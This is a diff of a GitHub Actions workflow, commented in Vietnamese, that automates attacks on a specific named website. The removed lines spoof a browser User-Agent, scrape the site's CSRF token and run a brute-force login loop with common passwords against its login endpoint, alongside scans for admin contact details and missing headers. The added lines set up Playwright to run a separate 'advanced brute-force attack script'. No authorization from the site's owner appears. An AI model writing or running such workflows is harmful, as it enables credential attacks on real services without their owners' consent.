@@ -1,96 +1,25 @@
-
-
 # .github/workflows/security-audit.yml
 
-name: Kiểm Tra Bảo Mật Tự Động (Demo Tấn Công)
+name: Kiểm Tra Bảo Mật Nâng Cao (Sử dụng Headless Browser)
 
 on:
   workflow_dispatch:
 
 jobs:
-  security-test:
+  advanced-security-test:
     runs-on: ubuntu-latest
     
-    env:
-      TARGET_URL: https://certapple.com
-
     steps:
-      - name: 1. [CAO] Kiểm tra lộ thông tin nhạy cảm của Admin
-        run: |
-          echo "::group::Đang quét mã nguồn trang chủ..."
-          if curl -s -H 'User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"' $TARGET_URL | grep -q -E 't.me/QTUNUy|37 724 0941|dev@kenhtao.site'; then
-            echo "::error file=index.html,line=1,col=1::LỖ HỔNG NGHIÊM TRỌNG: Tìm thấy thông tin liên hệ của Admin trong mã nguồn HTML!"
-            # exit 1 
-          else
-            echo "✅ TỐT: Không tìm thấy thông tin nhạy cảm của Admin."
-          fi
-          echo "::endgroup::"
+      - name: Lấy mã nguồn từ repository
+        uses: actions/checkout@v3
 
-      - name: 2. [CAO] Kiểm tra tải tài nguyên từ môi trường DEV
-        run: |
-          echo "::group::Đang quét các URL tài nguyên..."
-          if curl -s -H 'User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"' $TARGET_URL | grep -q 'h5m4.c19.e2-1.dev'; then
-            echo "::warning file=index.html,line=1,col=1::LỖ HỔNG CAO: Trang web đang tải tài nguyên từ tên miền development (h5m4.c19.e2-1.dev)."
-          else
-            echo "✅ TỐT: Không tìm thấy tài nguyên nào được tải từ môi trường dev."
-          fi
-          echo "::endgroup::"
+      - name: Cài đặt Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 18
 
-      - name: 3. [TRUNG BÌNH] Kiểm tra thiếu Header Content-Security-Policy (CSP)
-        run: |
-          echo "::group::Đang kiểm tra các HTTP Headers..."
-          if ! curl -s -I $TARGET_URL | grep -q -i 'Content-Security-Policy'; then
-            echo "::warning::LỖ HỔNG TRUNG BÌNH: Thiếu HTTP Header 'Content-Security-Policy' (CSP)."
-          else
-            echo "✅ TỐT: Đã có header Content-Security-Policy."
-          fi
-          echo "::endgroup::"
+      - name: Cài đặt Playwright và các trình duyệt
+        run: npx playwright install --with-deps
 
-      - name: 4. [DEMO TẤN CÔNG] Thử tấn công Brute-Force vào form đăng nhập
-        run: |
-          echo "::group::Bắt đầu mô phỏng tấn công Brute-Force..."
-          echo "Mục tiêu: $TARGET_URL/login_post"
-          
-          # Bước 1: Lấy CSRF token từ trang chủ, GIẢ MẠO USER-AGENT
-          echo "Đang lấy CSRF token (với User-Agent giả mạo)..."
-          
-          # ----- DÒNG ĐÃ SỬA ĐỔI -----
-          CSRF_TOKEN=$(curl -s -H 'User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"' $TARGET_URL | grep 'csrf-token' | sed -n 's/.*content="\([^"]*\)".*/\1/p')
-          # ---------------------------
-          
-          if [ -z "$CSRF_TOKEN" ]; then
-            echo "::error::Không thể lấy được CSRF token ngay cả khi đã giả mạo User-Agent. Server có thể có cơ chế chống bot nâng cao hơn. Dừng tấn công."
-            exit 1
-          fi
-          echo "✅ Lấy được CSRF Token: $CSRF_TOKEN"
-
-          # Bước 2: Chuẩn bị danh sách mật khẩu để thử
-          PASSWORDS=("123456" "password" "admin" "123123" "qwerty" "certapple")
-          EMAIL_TEST="attacker@test.com"
-          
-          echo "Sẽ thử tấn công với email '$EMAIL_TEST' và danh sách ${#PASSWORDS[@]} mật khẩu."
-
-          # Bước 3: Vòng lặp tấn công
-          for pass in "${PASSWORDS[@]}"; do
-            echo "------------------------------------"
-            echo "Đang thử mật khẩu: $pass"
-            
-            RESPONSE=$(curl -s -X POST "$TARGET_URL/login_post" \
-              -H "Content-Type: application/x-www-form-urlencoded" \
-              -H 'User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"' \
-              -d "email=$EMAIL_TEST&password=$pass&_token=$CSRF_TOKEN")
-            
-            if echo "$RESPONSE" | grep -q 'Tài khoản hoặc mật khẩu không đúng'; then
-              echo "Thất bại. Server phản hồi: Tài khoản hoặc mật khẩu không đúng."
-            elif echo "$RESPONSE" | grep -q 'token_key'; then
-              echo "::error::TẤN CÔNG THÀNH CÔNG! Mật khẩu '$pass' có thể là ĐÚNG hoặc server xử lý lỗi sai!"
-              exit 1
-            else
-              echo "::warning::Phản hồi không xác định từ server. Có thể server đã chặn hoặc có lỗi khác."
-              echo "Phản hồi: $RESPONSE"
-            fi
-          done
-          
-          echo "------------------------------------"
-          echo "✅ Hoàn thành demo tấn công. Việc server phản hồi liên tục cho thấy KHÔNG có cơ chế Rate Limiting (giới hạn số lần thử)."
-          echo "::endgroup::"
+      - name: Chạy Script Tấn Công Brute-Force Nâng Cao
+        run: node attack_script.js
